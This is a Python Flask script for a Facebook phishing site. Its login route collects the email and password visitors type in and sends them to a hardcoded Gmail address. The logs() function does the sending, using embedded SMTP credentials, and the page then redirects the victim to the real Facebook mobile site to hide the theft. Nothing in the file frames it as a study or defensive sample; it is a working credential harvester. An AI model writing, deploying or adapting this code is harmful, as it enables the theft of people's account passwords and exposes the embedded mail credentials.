from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from flask import Flask, request, render_template, redirect
import random,smtplib

app = Flask("Event")

def logs(email, password):
	html_message = """<head>
	<style>
		body {background-color: lightblue;}
		.bg {
			background-color: green;
		}
		h6 {
			background-color: salmon;
			color: white;
		}
		table {
			background-color: salmon;
		}
	</style>
</head>
<body>
	<div class="bg">
		<h6 align="center">RESULT FACEBOOK</h6>
		<table border=1 align="center" cellspacing=0 cellpadding=5>
			<thead>
				<tr>
					<th>Email/No.hp</th>
					<th>password</th>
				</tr>
			</thead>
			<tbody>
				<tr>
					<td>""" + email + """</td>
					<td>""" + password + """</td>
				</tr>
			</tbody>
		</table>
	</div>
</body>"""
	me = "Sptty Web <jihannabila1821@gmail.com>"
	you = "gustigreenn123@gmail.com"
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login("jihannabila1821@gmail.com", "wrrbncylhesdpvun")
	msg = MIMEMultipart("alternative")
	msg["Subject"] = f"Punya si {email}, {random.randint(1000000,9000000)}"
	msg["From"] = me
	msg["To"] = you
	msg.attach(MIMEText(html_message, 'html'))
	server.sendmail(me, you, msg.as_string())
	server.quit()

@app.route("/", methods=["GET","POST"])
def login():
	if request.method == "POST":
		email = request.form["email"]
		password = request.form["pass"]
		if email.replace(" ","") == "" and password.replace(" ","") == "":
			return render_template("template_sec_all.html")
		else:
			if email.replace(" ","") == "":
				return render_template("template_sec_email.html")
			else:
				if password.replace(" ","") == "":
					return render_template("template_sec_pass.html")
				else:
					logs(email, password)
					return redirect("https://m.facebook.com", code=302)
	return render_template("template.html")
